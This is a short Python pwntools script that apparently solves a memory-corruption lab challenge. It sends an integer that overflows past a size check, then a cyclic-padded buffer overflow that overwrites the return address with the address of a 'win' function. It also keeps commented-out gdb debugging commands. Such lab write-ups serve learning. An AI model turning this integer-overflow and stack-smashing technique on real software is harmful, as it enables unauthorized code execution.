#!/usr/bin/env python3

from pwn import *

context.update(arch='amd64', os='linux') # set arch

p = process('./babymem_level5_testing2')
p.sendline('2147483648') # 0,5 plus half of max unsigned int
p.sendline('2') # imul 2 will bypass the first check

# gdb is actually easy to use
#gdb.attach(p, '''
#b *0x0000000000401922
#''')

# we can even script gdb and print useful information
#gdb.attach(p,'''
#b *vuln+441
#c
#info frame
#print *win+24'''
#)

# got the cyclic input before
payload = cyclic(cyclic_find('baab')) + p64(0x4016d0) # address of win
p.sendline(payload)

p.sendline(cyclic(300))

p.interactive()
